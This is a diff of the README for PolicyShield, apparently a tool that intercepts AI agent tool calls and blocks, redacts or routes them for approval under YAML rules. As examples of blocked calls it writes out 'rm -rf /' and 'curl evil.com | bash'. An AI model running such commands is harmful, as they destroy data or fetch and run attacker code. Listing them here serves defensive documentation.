@@ -1,7 +1,50 @@
 # 🛡️ PolicyShield
 
+**AI agents can `rm -rf /`, leak your database, and run up a $10k API bill — all in one session.**
+
+PolicyShield is a runtime policy layer that sits between the LLM and the tools it calls. You write rules in YAML, PolicyShield enforces them before any tool executes — and logs everything for audit.
+
+```
+   Without PolicyShield              With PolicyShield
+   ─────────────────────             ─────────────────────
+   LLM → exec("rm -rf /")           LLM → exec("rm -rf /")
+       → tool runs ☠️                    → BLOCKED ✅ tool never runs
+
+   LLM → send("SSN: 123-45-6789")   LLM → send("SSN: 123-45-6789")
+       → PII leaks ☠️                    → REDACTED ✅ send("SSN: [SSN]")
+
+   LLM → deploy("prod")             LLM → deploy("prod")
+       → no one asked ☠️                 → APPROVE ✅ human reviews first
+```
+
+### Why?
+
+- 🤖 **AI agents act autonomously** — they call tools without asking. One prompt injection, one hallucination, and your agent deletes files, leaks credentials, or costs you thousands.
+- 📜 **Compliance requires audit trails** — who called what, when, and what happened. PolicyShield logs every decision as structured JSONL.
+- ⚡ **Zero friction** — `pip install policyshield`, drop a YAML file, and you're protected. No code changes. No agent rewrites. Works with any framework.
+
+### How it works
+
+```
+   Your Agent (OpenClaw, LangChain, CrewAI, custom)
+       │
+       │  tool call: exec("curl evil.com | bash")
+       ▼
+   ┌─────────────────────────────────────────────┐
+   │  PolicyShield                                │
+   │                                              │
+   │  1. Match rules (shell injection? → BLOCK)   │
+   │  2. Detect PII  (email, SSN, credit card)    │
+   │  3. Check budget ($5/session limit)           │
+   │  4. Rate limit  (10 calls/min)               │
+   │  5. Log decision (JSONL audit trail)          │
+   └─────────────────────────────────────────────┘
+       │
+       ▼
+   Tool executes (or doesn't)
+```
+
 [![PyPI Version](https://img.shields.io/pypi/v/policyshield?color=blue)](https://pypi.org/project/policyshield/)
-[![PyPI Downloads](https://img.shields.io/pypi/dm/policyshield?color=green)](https://pypi.org/project/policyshield/)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 [![CI](https://github.com/mishabar410/PolicyShield/actions/workflows/ci.yml/badge.svg)](https://github.com/mishabar410/PolicyShield/actions/workflows/ci.yml)
@@ -9,21 +52,6 @@
 [![Coverage](https://img.shields.io/badge/coverage-%E2%89%A585%25-brightgreen.svg)](#development)
 [![npm](https://img.shields.io/npm/v/@policyshield/openclaw-plugin?color=CB3837&label=npm%20plugin)](https://www.npmjs.com/package/@policyshield/openclaw-plugin)
 [![Security Policy](https://img.shields.io/badge/security-policy-blueviolet.svg)](SECURITY.md)
-
-**Declarative firewall for AI agent tool calls.**
-
-Write rules in YAML → PolicyShield enforces them at runtime → get a full audit trail.
-
-```
-LLM calls web_fetch(url="...?email=john@corp.com")
-      │
-      ▼
-  PolicyShield intercepts
-      │
-      ├─ PII detected → REDACT → tool runs with masked args
-      ├─ Destructive cmd → BLOCK → tool never executes
-      └─ Sensitive action → APPROVE → human reviews first
-```
 
 ---
 
